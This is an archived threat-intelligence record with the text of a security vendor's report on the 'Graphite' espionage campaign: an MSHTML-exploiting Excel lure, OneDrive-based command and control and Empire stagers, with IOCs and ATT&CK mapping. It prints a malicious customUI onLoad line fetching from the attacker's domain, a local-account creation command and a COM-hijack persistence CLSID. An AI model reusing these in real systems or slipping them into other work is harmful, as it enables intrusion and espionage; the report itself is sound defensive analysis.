{
    "id": "7184f4f4-8fe7-41e0-ac3c-7a8ad76a17bd",
    "created_at": "2022-10-25T16:48:13.263303Z",
    "updated_at": "2025-03-27T02:15:25.046167Z",
    "deleted_at": null,
    "sha1_hash": "3593410f781e8eb7a90bf4416630e3d34f6eec0f",
    "title": "Prime Minister's Office Compromised: Details of Recent Espionage Campaign",
    "authors": "Trellix",
    "file_creation_date": "2022-02-21T05:19:09Z",
    "file_modification_date": "2022-02-21T05:19:09Z",
    "file_size": 1808825,
    "plain_text": "# Prime Minister’s Office Compromised: Details of Recent Espionage Campaign\n\n**[trellix.com/en-gb/about/newsroom/stories/threat-labs/prime-ministers-office-compromised.html](https://www.trellix.com/en-gb/about/newsroom/stories/threat-labs/prime-ministers-office-compromised.html)**\n\nBy [Marc Elias · January 25, 2022](https://www.trellix.com/en-gb/about/newsroom/stories/contributors/marc-elias.html)\n\n[A special thanks to Christiaan Beek, Alexandre Mundo, Leandro Velasco and Max Kersten for](https://www.trellix.com/en-gb/about/newsroom/stories/contributors/christiaan-beek.html)\nmalware analysis and support during this investigation.\n\n**Executive Summary**\n\nOur Advanced Threat Research Team have identified a multi-stage espionage campaign\ntargeting high-ranking government officials overseeing national security policy and\nindividuals in the defense industry in Western Asia. As we detail the technical components of\nthis attack, we can confirm that we have undertaken pre-release disclosure to the victims and\nprovided all necessary content required to remove all known attack components from their\nenvironments.\n\nThe infection chain starts with the execution of an Excel downloader, most likely sent to the\nvictim via email, which exploits an MSHTML remote code execution vulnerability (CVE2021-40444) to execute a malicious executable in memory. The attack uses a follow-up piece\nof malware called Graphite because it uses Microsoft’s Graph API to leverage OneDrive as a\ncommand and control server—a technique our team has not seen before. Furthermore, the\nattack was split into multiple stages to stay as hidden as possible.\n\nCommand and control functions used an Empire server that was prepared in July 2021, and\nthe actual campaign was active from October to November 2021. The below blog will explain\nthe inner workings, victimology, infrastructure and timeline of the attack and, of course,\nreveal the IOCs and MITRE ATT&CK techniques.\n\nA number of the attack indicators and apparent geopolitical objectives resemble those\nassociated with the previously uncovered threat actor APT28. While we don’t believe in\nattributing any campaign solely based on such evidence, we have a moderate level of\nconfidence that our assumption is accurate. That said, we are supremely confident that we\nare dealing with a very skilled actor based on how infrastructure, malware coding and\noperation were setup.\n\nTrellix customers are protected by the different McAfee Enterprise and FireEye products that\nwere provided with these indicators.\n\n**Analysis of the Attack Process**\n\n\n-----\n\nThis section provides an analysis of the overall process of the attack, beginning with the\nexecution of an Excel file containing an exploit for the MSHTML remote code execution\n[vulnerability (CVE-2021-40444) vulnerability. This is used to execute a malicious DLL file](https://www.mcafee.com/blogs/enterprise/mcafee-enterprise-defender-blog-mshtml-cve-2021-40444/)\nacting as a downloader for the third stage malware we called Graphite. Graphite is a newly\ndiscovered malware sample based on a OneDrive Empire Stager which leverages OneDrive\naccounts as a command and control server via the Microsoft Graph API.\n\nThe last phases of this multi-stage attack, which we believe is associated with an APT\noperation, includes the execution of different Empire stagers to finally download an Empire\nagent on victims’ computers and engage the command and control server to remotely control\nthe systems.\n\nThe following diagram shows the overall process of this attack.\n\n**Figure 1. Attack flow**\nFirst Stage – Excel Downloaders\n\nAs suggested, the first stage of the attack likely uses a spear phishing email to lure victims\ninto opening an Excel file, which goes by the name “parliament_rew.xlsx”. Below you can see\nthe identifying information for this file:\n\nFile type Excel Microsoft Office Open XML Format document\n\nFile name parliament_rew.xlsx\n\nFile size 19.26 KB\n\n\nCompilation\ntime\n\n\n05/10/2021\n\n\nMD5 8e2f8c95b1919651fcac7293cb704c1c\n\nSHA-256 f007020c74daa0645b181b7b604181613b68d195bd585afd71c3cd5160fb8fc4\n\n\n-----\n\n**Figure 2. Decoy text observed in the Excel file**\nIn analyzing this file’s structure, we observed that it includes a folder named “customUI” that\ncontains a file named “customUI.xml”. Opening this file with a text editor, we observed that\nthe malicious document uses the “CustomUI.OnLoad” property of the OpenXML format to\nload an external file from a remote server:\n\n<customUI xmlns=\"http://schemas.microsoft.com/office/2006/01/customui\"\nonLoad='https://wordkeyvpload[.]net/keys/parliament_rew.xls!123'> </customUI>\n\nThis technique allows the attackers to bypass some antivirus scanning engines and office\nanalysis tools, decreasing the chances of the documents being detected.\n\nThe downloaded file is again an Excel spreadsheet, but this time it is saved using the old\nMicrosoft Office Excel 97-2003 Binary File Format (.xls). Below you can see the identifying\ninformation of the file:\n\nFile type Microsoft Office Excel 97-2003 Binary File Format\n\nFile name parliament_rew.xls\n\nFile size 20.00 KB\n\n\nCompilation\ntime\n\n\n05/10/2021\n\n\nMD5 abd182f7f7b36e9a1ea9ac210d1899df\n\nSHA-256 7bd11553409d635fe8ad72c5d1c56f77b6be55f1ace4f77f42f6bfb4408f4b3a\n\nAnalyzing the metadata objects, we can identify that the creator was using the codepage 1252\nused in Western European countries and the file was created on October 5th, 2021.\n\n\n-----\n\n**Figure 3. Document metadata**\nLater, we analyzed the OLE objects in the document and discovered a Linked Object\nOLEStream Structure which contains a link to the exploit of the CVE-2021-40444\nvulnerability hosted in the attackers’ server. This allows the document to automatically\ndownload the HTML file and subsequently call the Internet Explorer engine to interpret it,\ntriggering the execution of the exploit.\n\n**Figure 4. Remote link in OLE object**\nIn this blog post we won’t examine the internals of the CVE-2021-40444 vulnerability as it\nhas already been publicly explained and discussed. Instead, we will continue the analysis on\nthe second stage DLL contained in the CAB file of the exploit.\n\n**Second Stage – DLL Downloader**\n\nThe second stage is a DLL executable named fontsubc.dll which was extracted from the CAB\nfile used in the exploit mentioned before. You can see the identifying information of the file\nbelow:\n\nFile type PE32 executable for MS Windows (DLL) (console) Intel 80386 32-bit\n\n\n-----\n\nFile name fontsubc.dll\n\nFile size 88.50 KB\n\n\nCompilation\ntime\n\n\n28/09/2021\n\n\nMD5 81de02d6e6fca8e16f2914ebd2176b78\n\nSHA-256 1ee602e9b6e4e58dfff0fb8606a41336723169f8d6b4b1b433372bf6573baf40\n\nThis file exports a function called “CPlApplet” that Windows recognizes as a control panel\napplication. Primarily, this acts a downloader for the next stage malware which is located at\nhxxps://wordkeyvpload[.]net/keys/update[.]dat using COM Objects and the API\n“URLOpenBlockingStreamW”.\n\n**Figure 5. Download of next stage malware**\nAfter downloading the file, the malware will decrypt it with an embedded RSA Public Key and\ncheck its integrity calculating a SHA-256 of the decrypted payload. Lastly, the malware will\nallocate virtual memory, copy the payload to it and execute it.\n\n\n-----\n\n**Figure 6. Payload decryption and execution**\nBefore executing the downloaded payload, the malware will compare the first four bytes with\nthe magic value DE 47 AC 45 in hexadecimal; if they are different, it won’t execute the\npayload.\n\n**Figure 7. Malware magic value**\n\n**Third Stage – Graphite Malware**\n\nThe third stage is a DLL executable, never written to disk, named dfsvc.dll that we were able\nto extract from the memory of the previous stage. Below you can see the identifying\ninformation of the file:\n\nFile type PE32 executable for MS Windows (DLL) (console) Intel 80386 32-bit\n\nFile name dfsvc.dll\n\nFile size 24.00 KB\n\n\n-----\n\nCompilation\ntime\n\n\n20/09/2021\n\n\nMD5 0ff09c344fc672880fdb03d429c7bda4\n\nSHA-256 f229a8eb6f5285a1762677c38175c71dead77768f6f5a6ebc320679068293231\n\nWe named this malware Graphite due to the use of the Microsoft Graph API to use OneDrive\nas command and control. It is very likely that the developers of Graphite used the Empire\nOneDrive Stager as a reference due to the similarities of the functionality and the file\nstructure used in the OneDrive account of the actors.\n\n**Figure 8. Empire OneDrive stager API requests**\nGraphite starts by creating a mutex with the hardcoded name\n“250gHJAWUI289382s3h3Uasuh289di” to avoid double executions, decrypt the strings and\nresolve dynamically the APIs it will use later. Moreover, it will calculate a bot identifier to\nidentify the infected computer which is a CRC32 checksum of the value stored in the registry\nkey “HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\ Cryptography\\MachineGuid”.\n\n**Figure 9. Graphite initializations**\nNext, the malware will create a thread to monitor the execution of tasks and upload its results\nto the OneDrive account. Result files will be uploaded to the “update” folder of the attackers’\nOneDrive account.\n\n\n-----\n\n**Figure 10. Thread to monitor task results**\nAfter that, the malware will enter into an infinite loop where every 20 minutes it will obtain a\nnew OAuth2 token to use with the Microsoft Graph API requests and determine if there are\nnew tasks to execute in the “check” folder of the attackers’ OneDrive account.\n\n**Figure 11. Request of new OAuth2 token**\nOnce it obtained a valid OAuth2 token, reconnaissance data is gathered containing the\nfollowing information from the victims’ systems:\n\nRunning processes\n.NET CLR version from PowerShell\n\n\n-----\n\nWindows OS version\n\nThe data is compressed using the LZNT1 algorithm and encrypted with a hardcoded AES256-CBC key with a random IV. The operator tasks are encoded in the same way. Finally, the\nfile containing the system information is uploaded to the folder “{BOT_ID}/update” in\nOneDrive with a random name.\n\n**Figure 12. Graphite encoding data**\nGraphite will also query for new commands by enumerating the child files in the \"check\"\nsubdirectory. If a new file is found, it will use the Graph API to download the content of the\nfile and decrypt it. The decrypted tasks have two fields; the first one is a unique identifier of\nthe task and the second one specifies the command to execute.\n\nThe command value “1” will instruct the malware to send the system information to the\ncommand and control again, which is the attackers’ OneDrive. The command value “2”\nindicates that the decrypted task is a shellcode, and the malware will create a thread to\nexecute it.\n\n\n-----\n\n**Figure 13. Graphite commands**\nIf the received task is a shellcode, it will check the third field with the magic value DE 47 AC\n45 in hexadecimal and, if they are different, it won’t execute the payload. The rest of the bytes\nof the task is the shellcode that will be executed. Lastly, the task files are deleted from the\nOneDrive after being processed.\n\n**Figure 14. Decrypted operator task**\nThe diagram below summarizes the flow of the Graphite malware.\n\n\n-----\n\n**Figure 15. Graphite execution diagram**\n\n**Fourth Stage – Empire DLL Launcher Stager**\n\nThe fourth stage is a dynamic library file named csiresources.dll that we were able to extract\nfrom a task from the previous stage. The file was embedded into a Graphite shellcode task\nused to reflectively load the executable into the memory of the process and execute it. Below\nyou can see the identifying information of the file:\n\nFile type PE32 executable for MS Windows (DLL) (console) Intel 80386 32-bit\n\nFile name csiresources.dll\n\nFile size 111.00 KB\n\n\nCompilation\ntime\n\n\n21/09/2021\n\n\nMD5 138122869fb47e3c1a0dfe66d4736f9b\n\nSHA-256 25765faedcfee59ce3f5eb3540d70f99f124af4942f24f0666c1374b01b24bd9\n\n\n-----\n\nThe sample is a generated Empire DLL Launcher stager that will initialize and start the .NET\nCLR Runtime into an unmanaged process to execute a download-cradle to stage an Empire\nagent. With that, it is possible to run the Empire agent in a process that’s not PowerShell.exe.\n\nFirst, the malware will check if the malware is executing from the explorer.exe process. If it is\nnot, the malware will exit.\n\n**Figure 16. Process name check**\nNext, the malware will try to find the file “EhStorShell.dll” in the System32 folder and load it.\nWith this, the malware makes sure that the original “EhStorShell.dll” file is loaded into the\nexplorer.exe context.\n\n**Figure 17. Loading EhStorShell.dll library**\nThe previous operation is important because the follow-up malware will override the CLSID\n“{D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}” to gain persistence in the victims’\nsystem, performing a COM Hijacking technique. The aforementioned CLSID corresponds to\nthe “Enhanced Storage Shell Extension DLL” and is handled by the file “EhStorShell.dll”.\n\nComing up next, the malware will load, initialize and start the .NET CLR Runtime, XOR\ndecrypt the .NET next stage payload and load it into memory. Lastly, it will execute the file\nusing the .NET Runtime.\n\n**Figure 18. Decryption of next stage malware**\n\n\n-----\n\n**Fifth Stage – Empire PowerShell C# Stager**\n\nThe fifth stage is a .NET executable named Service.exe which was embedded and encrypted\nin the previous stage. Below you can see the identifying information of the file:\n\nFile type PE32 executable for MS Windows (console) Intel 80386 32-bit\n\nFile size 34.00 KB\n\nMD5 3b27fe7b346e3dabd08e618c9674e007\n\nSHA-256 d5c81423a856e68ad5edaf410c5dfed783a0ea4770dbc8fb4943406c316a4317\n\nThis sample is an Empire PowerShell C# Stager whose main goal is to create an instance of a\nPowerShell object, decrypt the embedded PowerShell script using XOR operations and\ndecode it with Base64 before finally executing the payload with the Invoke function.\n\n**Figure 19. Fifth stage code**\nThe reason behind using a .NET executable to load and execute PowerShell code is to bypass\nsecurity measures like AMSI, allowing execution from a process that shouldn’t allow it.\n\n**Sixth Stage – Empire HTTP PowerShell Stager**\n\nThe last stage is a PowerShell script, specifically an Empire HTTP Stager, which was\nembedded and encrypted in the previous stage. Below you can see the identifying\ninformation of the file:\n\nFile type Powershell script\n\nFile size 6.00 KB\n\nMD5 a81fab5cf0c2a1c66e50184c38283e0e\n\nSHA-256 da5a03bd74a271e4c5ef75ccdd065afe9bd1af749dbcff36ec7ce58bf7a7db37\n\n\n-----\n\nAs we mentioned earlier, this is the last stage of the multi-stage attack and is an HTTP stager\nhighly obfuscated using the Invoke-Obfuscation script from Empire to make analysis\ndifficult.\n\n**Figure 20. Obfuscated PowerShell script**\nThe main functionality of the script is to contact hxxp://wordkeyvpload[.]org/index[.]jsp to\nsend the initial information about the system and connect to the URL\nhxxp://wordkeyvpload[.]org/index[.]php to download the encrypted Empire agent, decrypt\nit with AES-256 and execute it.\n\n**Timeline of Events**\n\nBased on all the activities monitored and analyzed, we provide the following timeline of\nevents:\n\n**Figure 21. Timeline of the campaign**\n\n**Targeting**\n\nOne of the lure documents we mentioned before (named “parliament_rew.xlsx”) might have\nbeen aimed for targeting government employees.\n\nBesides targeting government entities, it appears this adversary also has its sights on the\ndefense industry. Another document with the name “Missions Budget.xlsx” contained the\ntext “Military and civilian missions and operations” and the budgets in dollars for the\nmilitary operations in some countries for the years 2022 and 2023.\n\n\n-----\n\n**Figure 22. Lure document targeting the defense sector**\nMoreover, from our telemetry we also have observed that Poland and other Eastern\nEuropean countries were of interest to the actors behind this campaign.\n\nThe complete victimology of the actors is unknown, but the lure documents we have seen\nshow its activities are centered in specific regions and industries. Based on the names, the\ncontent of the malicious Excel files and our telemetry, it seems the actors are targeting\ncountries in Eastern Europe and the most prevalent industries are Defense and Government.\n\n**Infrastructure**\n\nThanks to the analysis of the full attack chain, two hosts related to the attack were identified.\nThe first domain is wordkeyvpload.net which resolves to the IP 131.153.96.114, located in\nSerbia and registered on the 7th of July 2021 with OwnRegistrar Inc.\n\nQuerying the IP with a reverse DNS lookup tool, a PTR record was obtained resolving to the\ndomain “bwh7196.bitcoinwebhosting.net” which could be an indication that the server was\nbought from the Bitcoin Web Hosting VPS reseller company.\n\n**Figure 23. Reverse DNS query**\nThe main functionality of this command-and-control server is to host the HTML exploit for\nCVE-2021-40444 and the CAB file containing the second stage DLL.\n\nThe second domain identified is wordkeyvpload.org which resolves to the IP 185.117.88.19,\nlocated in Sweden, and registered on the 18th of June 2021 with Namecheap Inc. Based on\nthe operating system (Microsoft Windows Server 2008 R2), the HTTP server (Microsoft\n\n-----\n\nIIS/7.5) and the open ports (1337 and 5000) it is very likely the host is running the latest\nversion of the Empire post-exploitation framework.\n\nThe reason behind that hypothesis is that the default configuration of Empire servers uses\nport 1337 to host a RESTful API and port 5000 hosts a SocketIO interface to interact\nremotely with the server. Also, when deploying a HTTP Listener, the default value for the\nHTTP Server field is hardcoded to “Microsoft-IIS/7.5”.\n\n**Figure 24. Local Empire server execution with default configuration**\nWith the aforementioned information, as well as the extraction of the command and control\nfrom the last stage of the malware, we can confirm that this host acts as an Empire server\nused to remotely control the agents installed in victims’ machines and send commands to\nexecute them.\n\n**Attribution**\n\nDuring the timeline of this operation there have been some political tensions around the\nArmenian and Azerbaijani border. Therefore, from a classic intelligence operation point of\nview, it would make complete sense to infiltrate and gather information to assess the risk and\nmovements of the different parties involved.\n\n\n-----\n\nThroughout our research into the Graphite campaign, we extracted all timestamps of activity\nfrom the attackers from our telemetry and found two consistent trends. First, the activity\ndays of the adversary are from Monday to Friday, as depicted in the image below:\n\n**Figure 25. Adversary’s working days**\nSecond, the activity timestamps correspond to normal business hours (from 08h to 18h) in\nthe GMT+3 time zone, which includes Moscow Time, Turkey Time, Arabia Standard Time\nand East Africa Time.\n\n\n-----\n\n**Figure 26. Adversary’s working hours**\nAnother interesting discovery during the investigation was that the attackers were using the\nCLSID (D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D) for persistence, which matched\nwith an ESET report in which researchers mentioned a Russian Operation targeting Eastern\nEuropean countries.\n\nAnalyzing and comparing code-blocks and sequences from the graphite malware with our\ndatabase of samples, we discovered overlap with samples in 2018 being attributed to APT28.\nWe compared for example our samples towards this one:\n5bb9f53636efafdd30023d44be1be55bf7c7b7d5 (sha1):\n\n\n-----\n\n**Figure 27 Code comparison of samples**\nWhen we zoom in on some of the functions, we observe on the left side of the below picture\nthe graphite sample and on the right the forementioned 2018 sample. With almost three\nyears in time difference, it makes sense that code is changed, but still it looks like the\nprogrammer was happy with some of the previous functions:\n\n\n-----\n\n**Figure 28 Similar function flow**\nAlthough we mentioned some tactics, techniques and procedures (TTPs) of the actors behind\nthis campaign, we simply do not have enough context, similarities or overlap to point us with\nlow/moderate confidence towards APT28, let alone a nation-state sponsor. However, we\nbelieve we are dealing with a skilled actor based on how the infrastructure, malware coding\nand operation was setup.\n\n**Conclusion**\n\nThe analysis of the campaign described in this blog post allowed us to gather insights into a\nmulti-staged attack performed in early October, leveraging the MSHTML remote code\nexecution vulnerability (CVE-2021-40444) to target countries in Eastern Europe.\n\nAs seen in the analysis of the Graphite malware, one quite innovative functionality is the use\nof the OneDrive service as a Command and Control through querying the Microsoft Graph\nAPI with a hardcoded token in the malware. This type of communication allows the malware\nto go unnoticed in the victims’ systems since it will only connect to legitimate Microsoft\ndomains and won’t show any suspicious network traffic.\n\nThanks to the analysis of the full attack process, we were able to identify new infrastructure\nacting as command and control from the actors and the final payload, which is an agent from\nthe post-exploitation framework Empire. All the above allowed us to construct a timeline of\nthe activity observed in the campaign.\n\nThe actors behind the attack seem very advanced based on the targeting, the malware and the\ninfrastructure used in the operation, so we presume that the main goal of this campaign is\nespionage. With a low and moderate confidence, we believe this operation was executed by\nAPT28. To further investigate, we provided some tactics, techniques and procedures (TTPs),\nindicators on the infrastructure, targeting and capabilities to detect this campaign.\n\n**MITRE ATT&CK Techniques**\n\nTactic\n\n\nResource\nDevelopment\n\nResource\nDevelopment\n\n\nT1583.001 Acquire\nInfrastructure:\nDomains\n\nT1587.001 Develop\ncapabilities:\nMalware\n\n\nAttackers purchased\ndomains to be used\nas a command and\ncontrol.\n\nAttackers built\nmalicious\ncomponents to\nconduct their attack.\n\n\nwordkeyvpload[.]net\n\nwordkeyvpload[.]org\n\nGraphite malware\n\n\n-----\n\nResource\nDevelopment\n\n\nT1588.002 Develop\ncapabilities:\nTool\n\n\nEmpire\n\nBMD(2021)0247.xlsx\n\nCVE-2021-40444\n\nEmpire Powershell\nstager\n\nCLSID: D9144DCDE998-4ECA-AB6ADCD83CCBA16D\n\nnet user /add user1\n\nEmpire DLL\nLauncher stager\n\n\nInitial Access T1566.001 Phishing:\nSpear phishing\nAttachment\n\nExecution T1203 Exploitation for\nClient\nExecution\n\nExecution T1059.001 Command and\nScripting\nInterpreter:\nPowerShell\n\nPersistence T1546.015 Event\nTriggered\nExecution:\nComponent\nObject Model\nHijacking\n\nPersistence T1136.001 Create\nAccount: Local\nAccount\n\n\nAttackers employed\nred teaming tools to\nconduct their attack.\n\nAdversaries sent\nspear phishing\nemails with a\nmalicious\nattachment to gain\naccess to victim\nsystems.\n\nAdversaries\nexploited a\nvulnerability in\nMicrosoft Office to\nexecute code.\n\nAdversaries abused\nPowerShell for\nexecution of the\nEmpire stager.\n\nAdversaries\nestablished\npersistence by\nexecuting malicious\ncontent triggered by\nhijacked references\nto Component\nObject Model (COM)\nobjects.\n\nAdversaries created\na local account to\nmaintain access to\nvictim systems.\n\nAdversaries\nreflectively loaded\ncode into a process\nto conceal the\nexecution of\nmalicious payloads.\n\n\nDefense\nEvasion\n\n\nT1620 Reflective\nCode Loading\n\n\n-----\n\nCommand\nand Control\n\nCommand\nand Control\n\nCommand\nand Control\n\nCommand\nand Control\n\n\nT1104 Multi-Stage\nChannels\n\nT1102.002 Web Service:\nBidirectional\nCommunication\n\nT1573.001 Encrypted\nChannel:\nSymmetric\nCryptography\n\nT1573.002 Encrypted\nChannel:\nAsymmetric\nCryptography\n\n\nAdversaries created\nmultiple stages to\nobfuscate the\ncommand-andcontrol channel and\nto make detection\nmore difficult.\n\nAdversaries used an\nexisting, legitimate\nexternal Web service\nas a means for\nsending commands\nto and receiving\noutput from a\ncompromised\nsystem over the Web\nservice channel.\n\nAdversaries\nemployed a known\nsymmetric\nencryption algorithm\nto conceal command\nand control traffic\nrather than relying\non any inherent\nprotections provided\nby a communication\nprotocol.\n\nAdversaries\nemployed a known\nasymmetric\nencryption algorithm\nto conceal command\nand control traffic\nrather than relying\non any inherent\nprotections provided\nby a communication\nprotocol.\n\n\nUse of different\nEmpire stagers\n\nMicrosoft OneDrive\n\nEmpire Server\n\nAES 256\n\nRSA\n\n\n**Indicators of Compromise (IOCs)**\n\nFirst stage – Excel Downloaders\n\n40d56f10a54bd8031191638e7df74753315e76f198192b6e3965d182136fc2fa\n\nf007020c74daa0645b181b7b604181613b68d195bd585afd71c3cd5160fb8fc4\n\n\n-----\n\n7bd11553409d635fe8ad72c5d1c56f77b6be55f1ace4f77f42f6bfb4408f4b3a\n9052568af4c2e9935c837c9bdcffc79183862df083b58aae167a480bd3892ad0\nSecond stage – Downloader DLL\n\n1ee602e9b6e4e58dfff0fb8606a41336723169f8d6b4b1b433372bf6573baf40\nThird stage – Graphite\n\n35f2a4d11264e7729eaf7a7e002de0799d0981057187793c0ba93f636126135f\nf229a8eb6f5285a1762677c38175c71dead77768f6f5a6ebc320679068293231\nFourth stage – DLL Launcher Stager\n\n25765faedcfee59ce3f5eb3540d70f99f124af4942f24f0666c1374b01b24bd9\nFifth stage – PowerShell C# Stager\n\nd5c81423a856e68ad5edaf410c5dfed783a0ea4770dbc8fb4943406c316a4317\nSixth stage – Empire HTTP Powershell Stager\n\nda5a03bd74a271e4c5ef75ccdd065afe9bd1af749dbcff36ec7ce58bf7a7db37\nURLs\n\nhxxps://wordkeyvpload[.]net/keys/Missions Budget Lb.xls\nhxxps://wordkeyvpload[.]net/keys/parliament_rew.xls\nhxxps://wordkeyvpload[.]net/keys/Missions Budget.xls\nhxxps://wordkeyvpload[.]net/keys/TR_comparison.xls\nhxxps://wordkeyvpload[.]net/keys/JjnJq3.html\nhxxps://wordkeyvpload[.]net/keys/iz7hfD.html\nhxxps://wordkeyvpload[.]net/keys/Ari2Rc.html\nhxxps://wordkeyvpload[.]net/keys/OD4cNq.html\nhxxps://wordkeyvpload[.]net/keys/0YOL4.cab\nhxxps://wordkeyvpload[.]net/keys/whmel.cab\nhxxps://wordkeyvpload[.]net/keys/UdOpQ.cab\nhxxps://wordkeyvpload[.]net/keys/D9V5E.cab\nhxxps://wordkeyvpload[.]net/keys/update.dat\nhxxps://wordkeyvpload[.]org/index.jsp\nhxxps://wordkeyvpload[.]org/index.php\nhxxps://wordkeyvpload[.]org/news.php\nhxxps://wordkeyvpload[.]org/admin/get.php\nhxxps://wordkeyvpload[.]org/login/process.php\nDomains\n\nwordkeyvpload[.]net\nwordkeyvpload[.]org\njimbeam[.]live\nIPs\n\n131.153.96[.]114\n185.117.88[.]19\n94.140.112[.]178\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/ob3ngre0h78qxu0r7u40f810ejd7g57i"
    ],
    "report_names": [
        "Trellix_PrimeMinisters-Details-Espionage-Campaign(01-25-2022)"
    ],
    "threat_actors": [
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716493,
    "ts_updated_at": 1743041725,
    "ts_creation_date": 1645420749,
    "ts_modification_date": 1645420749,
    "files": {
        "pdf": "https://archive.orkl.eu/3593410f781e8eb7a90bf4416630e3d34f6eec0f.pdf",
        "text": "https://archive.orkl.eu/3593410f781e8eb7a90bf4416630e3d34f6eec0f.txt",
        "img": "https://archive.orkl.eu/3593410f781e8eb7a90bf4416630e3d34f6eec0f.jpg"
    }
}